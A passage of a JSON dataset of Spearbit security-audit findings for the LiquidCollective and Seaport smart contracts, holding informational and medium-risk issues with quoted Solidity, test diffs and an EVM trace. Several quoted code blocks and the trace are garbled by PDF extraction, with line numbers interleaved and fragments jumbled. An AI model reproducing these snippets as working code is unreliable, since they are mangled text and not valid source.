        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "BalanceToRedeem is only ever posses a non-zero value during the report processing when a quorum has been made for the oracle member votes (setConsensusLayerData). And at the very end of this process its value gets reset back to 0.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Improve clarity on bufferRebalancingMode variable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "According to the documentation, the bufferRebalancingMode flag passed by the oracle should allow or disallow the rebalancing of funds between the Deposit and Redeem buffers. The flag correctly disables rebalancing in the DepositBuffer to RedeemBuffer direction as can be seen here if (depositToRedeemRebalancingAllowed && availableBalanceToDeposit > 0) { uint256 rebalancingAmount = LibUint256.min( availableBalanceToDeposit, redeemManagerDemandInEth - exitingBalance - availableBalanceToRedeem ); if (rebalancingAmount > 0) { availableBalanceToRedeem += rebalancingAmount; _setBalanceToRedeem(availableBalanceToRedeem); _setBalanceToDeposit(availableBalanceToDeposit - rebalancingAmount); } } but it is not used at all when pulling funds in another way // if funds are left in the balance to redeem, we move them to the deposit balance _skimExcessBalanceToRedeem();",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Fix code style consistency issues",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "There is a small code styling mismatch between the new code under audit and the style used through the rest of the code. Specifically, function parameter names are supposed to be prepended with _ to differentiate them from variables defined in the function body.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove unused constants",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "DENOMINATION_OFFSET is unused and can be removed from the codebase.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document what TotalRequestedExits can potentially represent",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "Documentation is lacking for TotalRequestedExits. This parameter represents a quantity that is a mix of exited (or to be exited) and slashed validators for an operator. Also, in general, this is a rough quantity since we don't have a finer reporting of slashed and exited validators (they are reported as a sum).",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Operators need to listen to RequestedValidatorExits and exit their validators accordingly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "Operators need to listen to RequestedValidatorExits and exit their validators accordingly emit RequestedValidatorExits(operators[idx].index, requestedExits + operators[idx].picked); Note that requestedExits + operators[idx].picked represents the upper bound for the index of the funded validators that need to be exited by the operator.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Oracle members would need to listen to ClearedReporting and report their data if necessary",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "Oracle members would need to listen to ClearedReporting event and report their data if necessary",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "The only way for an oracle member to change its report data for an epoch is to reset the reporting process by changing its address",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "If an oracle member has made a mistake in its CL report to the Oracle or for some other reason would like to change its report, it would not be able to due to the following if block: // we retrieve the voting status of the caller, and revert if already voted if (ReportsPositions.get(uint256(memberIndex))) { revert AlreadyReported(report.epoch, msg.sender); } The only way for the said oracle member to be able to report different data is to reset its address by calling setMember. This would cause all the report variants and report positions to be cleared and force all the other oracle members to report their data again. Related:  Any oracle member can censor almost quorum report variants by resetting its address.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "For a quorum making CL report the epoch restrictions are checked twice.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "When an oracle member reports to the Oracle's reportConsensusLayerData, the requirements for a valid epoch is checked once in reportConsensusLayerData: // checks that the report epoch is not invalid if (!river.isValidEpoch(report.epoch)) { revert InvalidEpoch(report.epoch); } and once again in setConsensusLayerData // we start by verifying that the reported epoch is valid based on the consensus layer spec if (!_isValidEpoch(cls, report.epoch)) { revert InvalidEpoch(report.epoch); } Note that only the Oracle can call the setConsensusLayerData endpoint and the only time the Oracle makes this call is when the quorum is reached in reportConsensusLayerData.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Clear report variants and report position data during the migration to the new contracts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "Upon migration to the new contract with a new type of reporting data the old report positions and variants should be cleared by calling _clearReports() on the new contract or an older counterpart on the old contract. Note that the report variants slot will be changed from: bytes32(uint256(keccak256(\"river.state.reportsVariants\")) - 1) to: bytes32(uint256(keccak256(\"river.state.reportVariants\")) - 1)",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove unused functions from Oracle",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "The following functions are unused and can be removed from the Oracle's implementation  isValidEpoch  getTime  getExpectedEpochId  getLastCompletedEpochId  getCurrentEpochId  getCLSpec  getCurrentFrame  getFrameFirstEpochId  getReportBounds",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "RedeemManager. _claimRedeemRequests - Consider adding the recipient to the revert message in case of failure",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "The purpose of the _claimRedeemRequests function is to facilitate the claiming of ETH on behalf of another party who has a valid redeem request. It is worth noting that if any of the calls to recipients fail, the entire transaction will revert. Although it is impossible to conduct a denial-of-service (DoS) attack in this scenario, as the worst-case scenario only allows the transaction sender to specify a different array of redeemRequestIds, it may still be challenging to determine the specific redemption request that caused the transaction to fail.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Exit validator picking strategy does not consider slashed validator between reported epoch and current epoch",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "The current picking strategy in the OperatorsRegistry._pickNextValidatorsToExitFromActive- Operators function relies on a report from an old epoch. In between the reported epoch and the current epoch, validators might have been slashed and so the strategy might pick and signal to the operators those validators that have been slashed. As a result, the suggested number of validators to exit the protocol to compensate for the redemption demand in the next round of reports might not be exactly what was requested. Similarly, the OperatorsV2._hasExitableKeys function only evaluates based on a report from an old epoch. In between the reported epoch and the current epoch, validators might have been slashed. Thus, some returned operators might not have exitable keys in the current epoch.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Duplicated functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "_getStoppedValidatorsCountFromRawArray functions are the same. Operator.2._getStoppedValidatorCountAtIndex The and OperatorsRegistry.1. 30 function _getStoppedValidatorCountAtIndex(uint32[] storage stoppedValidatorCounts, uint256 if (index + 1 >= stoppedValidatorCounts.length) { return 0; } return stoppedValidatorCounts[index + 1]; function _getStoppedValidatorsCountFromRawArray(uint32[] storage stoppedValidatorCounts, internal view returns (uint32) index) File: Operators.2.sol 142: ,! 143: 144: 145: 146: 147: 148: 149: 150: 151: } { uint256 operatorIndex) internal view returns (uint32) File: OperatorsRegistry.1.sol 484: ,! 485: 486: 487: 488: 489: 490: 491: 492: 493: return 0; { } if (operatorIndex + 1 >= stoppedValidatorCounts.length) { } return stoppedValidatorCounts[operatorIndex + 1];",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Funds might be pulled from CoverageFundV1 even when there has been no slashing incident.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "vars.availableAmountToUpperBound might be positive even though no validators have been slashed. In this case, we still pull funds from the coverage funds contract to get closer to the upper bound limit: // if we have available amount to upper bound after pulling the exceeding eth buffer, we attempt to pull coverage funds ,! if (vars.availableAmountToUpperBound > 0) { // we pull the funds from the coverage recipient vars.trace.pulledCoverageFunds = _pullCoverageFunds(vars.availableAmountToUpperBound); // we do not update the rewards as coverage is not considered rewards // we do not update the available amount as there are no more pulling actions to perform afterwards } So it is possible the slashed coverage funds get used even when there has been no slashing to account for.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Update inline documentation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": " OracleManager.1.sol functions highlighted in Context are missing the @return natspec.  IOracle.1.sol#L204's highlighted comment is outdated. setMember can now also be called by the member itself. Also, there is a typo: adminitrator -> administrator. File: IOracle.1.sol 204: 209: /// @dev Only callable by the adminitrator @audit typo and outdated function setMember(address _oracleMember, address _newAddress) external; modifier onlyAdminOrMember(address _oracleMember) { if (msg.sender != _getAdmin() && msg.sender != _oracleMember) { revert LibErrors.Unauthorized(msg.sender); File: Oracle.1.sol 28: 29: 30: 31: 32: 33: ... 189: ,! } _; } function setMember(address _oracleMember, address _newAddress) external onlyAdminOrMember(_oracleMember) {",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document/mark unused (would-be-stale) storage parameters after migration",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "The following storage parameters will be unused after the migration of the protocol to v1  CLValidatorCount  CLValidatorTotalBalance  LastOracleRoundId.sol  OperatorsV1, this will be more than one slot (it occupies regions of storage)  ReportVariants, the slot has been changed (that means right after migration ReportVariants will be an empty array by default): bytes32(uint256(keccak256(\"river.state.reportsVariants\")) - 1); - bytes32 internal constant REPORTS_VARIANTS_SLOT = ,! + bytes32 internal constant REPORT_VARIANTS_SLOT ,! = bytes32(uint256(keccak256(\"river.state.reportVariants\")) - 1);",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "pullEth, pullELFees and pullExceedingEth do not check for a non-zero amount before sending funds to River",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "pullCoverageFunds makes sure that the amount sending to River is non-zero before calling its corresponding endpoint. This behavior differs from the implementations of  pullELFees  pullExceedingEth  pullEth 33 Not checking for a non-zero value has the added benefit of saving gas when the value is non-zero, while the check for a non-zero value before calling back River saves gas for cases when the amount could be 0.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "The spent offer amounts provided to OrderFulfilled for collection of (advanced) orders is not the actual amount spent in general",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "When Seaport is called to fulfill or match a collection of (advanced) orders, the OrderFulfilled is called before applying fulfillments and executing transfers. The offer and consideration items have the following forms: C = (It , T , i, acurr , R, acurr ) O = (It , T , i, acurr , acurr ) Where parameter description It T i acurr R O C itemType token identifier the interpolation of startAmount and endAmount depending on the time and the fraction of the order. consideration item's recipient offer item. consideration item. The SpentItems and ReceivedItem items provided to OrderFulfilled event ignore the last component of the offer/consideration items in the above form since they are redundant. Seaport enforces that all consideration items are used. But for the endpoints in this context, we might end up with offer items with only a portion of their amounts being spent. So in the end O.acurr might not be the amount spent for this offer item, but OrderFulfilled emits O.acurr as the amount spent. This can cause discrepancies in off-chain bookkeeping by agents listening for this event. The fulfillOrder and fulfillAdvancedOrder do not have this issue, since all items are enforced to be used. These two endpoints also differ from when there are collections of (advanced) orders, in that they would emit the OrderFulfilled at the of their call before clearing the reentrancy guard.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "The spent offer item amounts shared with a zone for restricted (advanced) orders or with a contract offerer for orders of CONTRACT order type is not the actual spent amount in general",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "When Seaport is called to fulfill or match a collection of (advanced) orders, there are scenarios where not all offer items will be used. When not all the current amount of an offer item is used and if this offer item belongs to an order which is of either CONTRACT order type or it is restricted order (and the caller is not the zone), then the spent amount shared with either the contract offerer or zone through their respective endpoints (validateOrder for zones and ratifyOrder for contract offerers) does not reflect the actual amount spent. When Seaport is called through one of its more complex endpoints to match or fulfill orders, the offer items go through a few phases: parameter description It T i as ae acurr O itemType token identifier startAmount endAmount the interpolation of startAmount and endAmount depending on the time and the fraction of the order. offer item.  Let's assume an offer item is originally O = (It , T , i, as, ae)  In _validateOrdersAndPrepareToFulfill, O gets transformed into (It , T , i, acurr , acurr )  Then depending on whether the order is part of a match (1, 2. 3) or fulfillment (1, 2) order and there is a corresponding fulfillment data pointing at this offer item, it might transform into (It , T , i, b, acurr ) where b 2 [0, 1). For fulfilling a collection of orders b 2 {0, acurr } depending on whether the offer item gets used or not, but for match orders, it can be in the more general range of b 2 [0, 1).  And finally for restricted or CONTRACT order types before calling _assertRestrictedAdvancedOrderValidity, the offer item would be transformed into (It , T , i, acurr , acurr ). So the startAmount of an offer item goes through the following flow: as ! acurr ! b 2 [0, 1) ! acurr 7 And at the end acurr is the amount used when Seaport calls into the validateOrder of a zone or ratifyOrder of a contract offerer. acurr does not reflect the actual amount that this offer item has contributed to a combined amount used for an execution transfer.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Empty criteriaResolvers for criteria-based contract orders",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "There is a deviation in how criteria-based items are resolved for contract orders. For contract orders which have offers with criteria, the _compareItems function checks that the contract offerer returned a corresponding non-criteria based itemType when identifierOrCriteria for the original item is 0, i.e., offering from an entire collection. Afterwards, the orderParameters.offer array is replaced by the offer array returned by the contract offerer. For other criteria-based orders such as offers with identifierOrCriteria = 0, the itemType of the order is only updated during the criteria resolution step. This means that for such offers there should be a corresponding CriteriaResolver struct. See the following test: 8 modified @@ -3568,9 +3568,8 @@ describe(`Advanced orders (Seaport v${VERSION})`, function () { test/advanced.spec.ts // Seller approves marketplace contract to transfer NFTs await set1155ApprovalForAll(seller, marketplaceContract.address, true); - - + const { root, proofs } = merkleTree([nftId]); const offer = [getTestItem1155WithCriteria(root, toBN(1), toBN(1))]; const offer = [getTestItem1155WithCriteria(toBN(0), toBN(1), toBN(1))]; const consideration = [ getItemETH(parseEther(\"10\"), parseEther(\"10\"), seller.address), @@ -3578,8 +3577,9 @@ describe(`Advanced orders (Seaport v${VERSION})`, function () { getItemETH(parseEther(\"1\"), parseEther(\"1\"), owner.address), ]; + - + // Replacing by `const criteriaResolvers = []` will revert const criteriaResolvers = [ buildResolver(0, 0, 0, nftId, proofs[nftId.toString()]), buildResolver(0, 0, 0, nftId, []), ]; const { order, orderHash, value } = await createOrder( However, in case of contract offers with identifierOrCriteria = 0, Seaport 1.2 does not expect a corresponding CriteriaResolver struct and will revert if one is provided as the itemType was updated to be the corresponding non-criteria based itemType. See advanced.spec.ts#L510 for a test case. Note: this also means that the fulfiller cannot explicitly provide the identifier when a contract order is being fulfilled. A malicious contract may use this to their advantage. For example, assume that a contract offerer in Seaport only accepts criteria-based offers. The fulfiller may first call previewOrder where the criteria is always resolved to a rare NFT, but the actual execution would return an uninteresting NFT. If such offers also required a corresponding resolver (similar behaviour as regular criteria based orders), then this could be fixed by explicitly providing the identifier--akin to a slippage check. In short, for regular criteria-based orders with identifierOrCriteria = 0 the fulfiller can pick which identifier to receive by providing a CriteriaResolver (as long as it's valid). For contract orders, fulfillers don't have this option and contracts may be able to abuse this.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Advance orders of CONTRACT order types can generate orders with less consideration items that would break the aggregation routine",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "When Seaport gets a collection of advanced orders to fulfill or match, if one of the orders has a CON- TRACT order type, Seaport calls the generateOrder(...) endpoint of that order's offerer. generateOrder(...) can provide fewer consideration items for this order. So the total number of consideration items might be less than the ones provided by the caller. But since the caller would need to provide the fulfillment data beforehand to Seaport, they might use indices that would turn to be out of range for the consideration in question after the modification applied for the contract offerer above. If this happens, the whole call will be reverted. This issue is in the same category as Advance orders of CONTRACT order types can generate orders with different consideration recipients that would break the aggregation routine.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "AdvancedOrder.numerator and AdvancedOrder.denominator are unchecked for orders of CONTRACT or- der type",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "For most advanced order types, we have the following check: // Read numerator and denominator from memory and place on the stack. uint256 numerator = uint256(advancedOrder.numerator); uint256 denominator = uint256(advancedOrder.denominator); // Ensure that the supplied numerator and denominator are valid. if (numerator > denominator || numerator == 0) { _revertBadFraction(); } For CONTRACT order types this check is skipped. For later calculations (calculating the current amount) Seaport uses the numerator and denominator returned by _getGeneratedOrder which as a pair it's either (1, 1) or (0, 0). advancedOrder.numerator is only used to skip certain operations in some loops when it is 0:  Skip applying criteria resolvers. 10  Skip aggregating the amount for executions.  Skip the final validity check. Skipping the above operations would make sense. But when for an advancedOrder with CONTRACT order type _get- GeneratedOrder returns (h, 1, 1) and advancedOrder.numerator == 0, we would skip applying criteria resolvers, aggregating the amounts from offer or consideration amounts for this order and skip the final validity check that would call into the ratifyOrder endpoint of the offerer. But emiting the following OrderFulfilled will not be skipped, even though this advancedOrder will not be used. // Emit an OrderFulfilled event. _emitOrderFulfilledEvent( orderHash, orderParameters.offerer, orderParameters.zone, recipient, orderParameters.offer, orderParameters.consideration ); This can create discrepancies between what happens on chain and what off-chain agents index/record.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Calls to PausableZone's executeMatchAdvancedOrders and executeMatchOrders would revert if un- used native tokens would need to be returned",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "In match (advanced) orders, one can provide native tokens as offer and consideration items. So a PausableZone would need to provide msg.value to call the corresponding Seaport endpoints. There are a few scenarios where not all the msg.value native tokens amount provided to the Seaport marketplace will be used: 1. Rounding errors in calculating the current amount of offer or consideration items. The zone can prevent send- ing extra native tokens to Seaport by pre-calculating these values and making sure to have its transaction to be included in the specific block that these values were calculated for (this is important when the start and end amount of an item are not equal). 2. The zone (un)intentionally sends more native tokens that it is necessary to Seaport. 3. The (advanced) orders sent for matching in Seaport include order type of CONTRACT offerer order and the of- ferer contract provides different amount for at least one item that would eventually make the whole transaction not use the full amount of msg.value provided to it. In all these cases, since PausableZone does not have a receive or fallback endpoint to accept native tokens, when Seaport tries to send back the unsued native token amount the transaction may revert. PausableZone not accepting native tokens: $ export CODE=$(jq -r '.deployedBytecode' artifacts/contracts/zones/PausableZone.sol/PausableZone.json | tr -d '\\n') ,! $ evm --code $CODE --value 1 --prestate genesis.json --sender ,! 0xb4d0000000000000000000000000000000000000 --nomemory=false --debug run $ evm --input $(echo $CODE | head -c 44 - | sed -E s/0x//) disasm 6080806040526004908136101561001557600080fd 00000: PUSH1 0x80 00002: DUP1 00003: PUSH1 0x40 00005: MSTORE 00006: PUSH1 0x04 00008: SWAP1 00009: DUP2 0000a: CALLDATASIZE 0000b: LT 0000c: ISZERO 0000d: PUSH2 0x0015 00010: JUMPI 00011: PUSH1 0x00 00013: DUP1 00014: REVERT trace of evm ... --debug run error: execution reverted #### TRACE #### PUSH1 pc=00000000 gas=4700000 cost=3 DUP1 pc=00000002 gas=4699997 cost=3 12 Stack: 00000000 0x80 PUSH1 Stack: 00000000 00000001 MSTORE Stack: 00000000 00000001 00000002 PUSH1 Stack: 00000000 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 SWAP1 Stack: 00000000 00000001 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 DUP2 Stack: 00000000 00000001 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 pc=00000003 gas=4699994 cost=3 pc=00000005 gas=4699991 cost=12 pc=00000006 gas=4699979 cost=3 0x80 0x80 0x40 0x80 0x80 0x80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000008 gas=4699976 cost=3 0x4 0x80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000009 gas=4699973 cost=3 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000010 gas=4699970 cost=2 0x4 0x80 0x4 CALLDATASIZE Stack: 00000000 00000001 00000002 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| 13 LT Stack: 00000000 00000001 00000002 00000003 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 ISZERO Stack: 00000000 00000001 00000002 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 PUSH2 Stack: 00000000 00000001 00000002 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 JUMPI Stack: 00000000 00000001 00000002 00000003 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 PUSH1 Stack: 00000000 00000001 Memory: 00000000 00000010 00000020 pc=00000011 gas=4699968 cost=3 0x0 0x4 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000012 gas=4699965 cost=3 0x1 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000013 gas=4699962 cost=3 0x0 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000016 gas=4699959 cost=10 0x15 0x0 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000017 gas=4699949 cost=3 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 14 00000030 00000040 00000050 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| DUP1 Stack: 00000000 00000001 00000002 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 REVERT Stack: 00000000 00000001 00000002 00000003 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 pc=00000019 gas=4699946 cost=3 0x0 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000020 gas=4699943 cost=0 0x0 0x0 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| #### LOGS #### genesis.json: { \"gasLimit\": \"4700000\", \"difficulty\": \"1\", \"alloc\": { \"0xb4d0000000000000000000000000000000000000\": { \"balance\": \"10000000000000000000000000\", \"code\": \"\", \"storage\": {} } } } // file: test/zone.spec.ts ... it(\"Fulfills an order with executeMatchAdvancedOrders with NATIVE Consideration Item\", async () => { const pausableZoneControllerFactory = await ethers.getContractFactory( \"PausableZoneController\", owner ); const pausableZoneController = await pausableZoneControllerFactory.deploy( owner.address ); // Deploy pausable zone const zoneAddr = await createZone(pausableZoneController); 15 // Mint NFTs for use in orders const nftId = await mintAndApprove721(seller, marketplaceContract.address); // Define orders const offerOne = [ getTestItem721(nftId, toBN(1), toBN(1), undefined, testERC721.address), ]; const considerationOne = [ getOfferOrConsiderationItem( 0, ethers.constants.AddressZero, toBN(0), parseEther(\"0.01\"), parseEther(\"0.01\"), seller.address ), ]; const { order: orderOne, orderHash: orderHashOne } = await createOrder( seller, zoneAddr, offerOne, considerationOne, 2 ); const offerTwo = [ getOfferOrConsiderationItem( 0, ethers.constants.AddressZero, toBN(0), parseEther(\"0.01\"), parseEther(\"0.01\"), undefined ), ]; const considerationTwo = [ getTestItem721( nftId, toBN(1), toBN(1), buyer.address, testERC721.address ), ]; const { order: orderTwo, orderHash: orderHashTwo } = await createOrder( buyer, zoneAddr, offerTwo, considerationTwo, 2 ); const fulfillments = [ [[[0, 0]], [[1, 0]]], [[[1, 0]], [[0, 0]]], ].map(([offerArr, considerationArr]) => toFulfillment(offerArr, considerationArr) ); // Perform the match advanced orders with zone const tx = await pausableZoneController .connect(owner) 16 .executeMatchAdvancedOrders( zoneAddr, marketplaceContract.address, [orderOne, orderTwo], [], fulfillments, { value: parseEther(\"0.01\").add(1) } // the extra 1 wei reverts the tx ); // Decode all events and get the order hashes const orderFulfilledEvents = await decodeEvents(tx, [ { eventName: \"OrderFulfilled\", contract: marketplaceContract }, ]); expect(orderFulfilledEvents.length).to.equal(fulfillments.length); // Check that the actual order hashes match those from the events, in order const actualOrderHashes = [orderHashOne, orderHashTwo]; orderFulfilledEvents.forEach((orderFulfilledEvent, i) => expect(orderFulfilledEvent.data.orderHash).to.be.equal( actualOrderHashes[i] ) ); }); ... This bug also applies to Seaport 1.1 and PausableZone (0x004C00500000aD104D7DBd00e3ae0A5C00560C00)",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Medium Risk"
        ]
    },
    {
